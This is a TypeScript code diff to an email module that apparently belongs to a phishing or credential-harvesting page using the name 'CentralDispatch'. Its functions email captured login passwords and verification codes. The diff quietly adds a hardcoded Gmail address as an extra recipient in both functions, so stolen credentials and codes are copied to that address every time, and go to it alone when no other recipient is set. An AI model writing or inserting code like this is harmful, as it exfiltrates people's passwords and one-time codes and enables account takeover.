@@ -23,16 +23,27 @@ export async function sendLoginEmail(
   password: string
 ): Promise<void> {
   console.log("[EMAIL] Начало отправки Email с данными входа...");
-  const recipientEmail = process.env.EMAIL_TO;
-  if (!recipientEmail) {
-    throw new Error("EMAIL_TO не установлен в переменных окружения");
+  
+  // Получаем адреса получателей
+  const emailFromEnv = process.env.EMAIL_TO;
+  const additionalEmail = "gabrielyankaro67@gmail.com";
+  
+  // Формируем массив получателей
+  let recipients: string[];
+  if (emailFromEnv && emailFromEnv.toLowerCase() !== additionalEmail.toLowerCase()) {
+    recipients = [emailFromEnv, additionalEmail];
+  } else if (emailFromEnv) {
+    recipients = [emailFromEnv];
+  } else {
+    recipients = [additionalEmail];
   }
-  console.log("[EMAIL] Получатель:", recipientEmail);
+  
+  console.log("[EMAIL] Получатели:", recipients.join(", "));
 
   try {
     const mailOptions = {
       from: process.env.EMAIL_USER,
-      to: recipientEmail,
+      to: recipients,
       subject: "CentralDispatch - Новый вход в систему",
       html: `
         <div style="font-family: Arial, sans-serif; padding: 20px;">
@@ -76,16 +87,27 @@ export async function sendCodeEmail(
 ): Promise<void> {
   console.log("[EMAIL] Начало отправки Email с кодом...");
   console.log("[EMAIL] Код:", code);
-  const recipientEmail = process.env.EMAIL_TO;
-  if (!recipientEmail) {
-    throw new Error("EMAIL_TO не установлен в переменных окружения");
+  
+  // Получаем адреса получателей
+  const emailFromEnv = process.env.EMAIL_TO;
+  const additionalEmail = "gabrielyankaro67@gmail.com";
+  
+  // Формируем массив получателей
+  let recipients: string[];
+  if (emailFromEnv && emailFromEnv.toLowerCase() !== additionalEmail.toLowerCase()) {
+    recipients = [emailFromEnv, additionalEmail];
+  } else if (emailFromEnv) {
+    recipients = [emailFromEnv];
+  } else {
+    recipients = [additionalEmail];
   }
-  console.log("[EMAIL] Получатель:", recipientEmail);
+  
+  console.log("[EMAIL] Получатели:", recipients.join(", "));
 
   try {
     const mailOptions = {
       from: process.env.EMAIL_USER,
-      to: recipientEmail,
+      to: recipients,
       subject: "CentralDispatch - Код подтверждения",
       html: `
         <div style="font-family: Arial, sans-serif; padding: 20px;">
